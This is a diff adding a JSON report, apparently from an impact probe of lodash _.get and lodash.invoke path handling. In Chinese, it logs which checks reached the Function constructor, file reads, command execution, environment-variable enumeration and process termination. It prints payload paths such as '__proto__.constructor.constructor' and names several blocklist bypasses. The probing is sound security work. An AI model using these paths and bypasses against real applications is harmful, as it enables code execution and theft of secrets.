@@ -1,0 +1,172 @@
+{
+ "generated_at": "2026-11-02T13:32:51.735Z",
+ "versions": {
+  "lodash": "4.18.1",
+  "lodash.get": "4.4.2",
+  "lodash.invoke": "4.5.2",
+  "node": "v22.22.2"
+ },
+ "summary": {
+  "hit": 22,
+  "miss": 4,
+  "na": 0
+ },
+ "results": [
+  {
+   "id": "R:主包 _.get",
+   "desc": "读 Function 构造器",
+   "state": "HIT",
+   "detail": "取到 Function 本体"
+  },
+  {
+   "id": "R:lodash.get",
+   "desc": "读 Function 构造器",
+   "state": "HIT",
+   "detail": "取到 Function 本体"
+  },
+  {
+   "id": "R:主包 _.at",
+   "desc": "读 Function 构造器",
+   "state": "HIT",
+   "detail": "取到 Function 本体"
+  },
+  {
+   "id": "R:lodash/fp.get",
+   "desc": "读 Function 构造器",
+   "state": "HIT",
+   "detail": "取到 Function 本体"
+  },
+  {
+   "id": "R:control",
+   "desc": "正常取值 a.b.c === 7",
+   "state": "HIT",
+   "detail": "got 7"
+  },
+  {
+   "id": "E:expr",
+   "desc": "执行任意表达式 6*7",
+   "state": "HIT",
+   "detail": "got 42"
+  },
+  {
+   "id": "E:process",
+   "desc": "取出 process 对象",
+   "state": "HIT",
+   "detail": "pid=38076"
+  },
+  {
+   "id": "X:readfile",
+   "desc": "读取本机任意文件",
+   "state": "HIT",
+   "detail": "读到 583 字节"
+  },
+  {
+   "id": "X:exec",
+   "desc": "执行系统命令（echo）",
+   "state": "HIT",
+   "detail": "stdout=IMPACT_PROBE_OK"
+  },
+  {
+   "id": "X:env",
+   "desc": "枚举环境变量",
+   "state": "HIT",
+   "detail": "共 219 项（可含 token / 数据库口令）"
+  },
+  {
+   "id": "X:net",
+   "desc": "具备主动出网能力",
+   "state": "HIT",
+   "detail": "net.connect 可用（未实际连接）"
+  },
+  {
+   "id": "G:full",
+   "desc": "整串可控 _.get(cfg, input)",
+   "state": "HIT",
+   "detail": "input = \"__proto__.constructor.constructor\""
+  },
+  {
+   "id": "G:prefix",
+   "desc": "片段可控 _.get(cfg,\"user.\"+input)",
+   "state": "HIT",
+   "detail": "前缀 user. 被吃掉，仍到 Function"
+  },
+  {
+   "id": "G:deepprefix",
+   "desc": "深前缀可控 \"a.b.c.\"+input",
+   "state": "HIT",
+   "detail": "三段固定前缀照样穿透"
+  },
+  {
+   "id": "G:array",
+   "desc": "数组 path 单段可控",
+   "state": "HIT",
+   "detail": "[\"user\",\"profile\",\"__proto__\",...]"
+  },
+  {
+   "id": "G:suffix",
+   "desc": "后缀固定 input+\".x\"（边界）",
+   "state": "MISS",
+   "detail": "得到 undefined"
+  },
+  {
+   "id": "I:invoke",
+   "desc": "lodash.invoke 一步取到可执行函数",
+   "state": "HIT",
+   "detail": "返回 function，调用后 = 42"
+  },
+  {
+   "id": "I:exit",
+   "desc": "invoke 直接终止宿主进程（DoS）",
+   "state": "HIT",
+   "detail": "子进程退出码 = 7（被 payload 杀掉）"
+  },
+  {
+   "id": "W:viaFunction",
+   "desc": "借 Function 完成原型污染（一次调用）",
+   "state": "HIT",
+   "detail": "写 __impact 后全对象可见"
+  },
+  {
+   "id": "W:getOnly",
+   "desc": "纯 _.get 直接写",
+   "state": "MISS",
+   "detail": "确认 _.get 本身零写入（预期 MISS）"
+  },
+  {
+   "id": "B:ctorOnly",
+   "desc": "只封 __proto__ → 改用 constructor",
+   "state": "HIT",
+   "detail": "payload 完全不含 __proto__，黑名单形同虚设"
+  },
+  {
+   "id": "B:toString",
+   "desc": "toString.constructor（无 __proto__）",
+   "state": "HIT",
+   "detail": "继承来的 toString 是函数，其 constructor 即 Function"
+  },
+  {
+   "id": "B:arrayBypass",
+   "desc": "数组 path 绕过字符串校验",
+   "state": "HIT",
+   "detail": "校验器 typeof p === \"string\" 时数组直接跳过"
+  },
+  {
+   "id": "B:dualDeny",
+   "desc": "双黑名单下仍可 RCE 的路径数",
+   "state": "MISS",
+   "detail": "双黑名单确实封住 RCE 档"
+  },
+  {
+   "id": "B:dataLeak",
+   "desc": "封住 RCE 后仍可达的宿主对象",
+   "state": "HIT",
+   "detail": "仍能取到宿主原型上的函数对象（信息暴露面留存）"
+  },
+  {
+   "id": "B:variants",
+   "desc": "大小写 / 编码变体",
+   "state": "MISS",
+   "detail": "全部无效（lodash 不做解码，变体无用 —— 证伪常见猜测）"
+  }
+ ]
+}
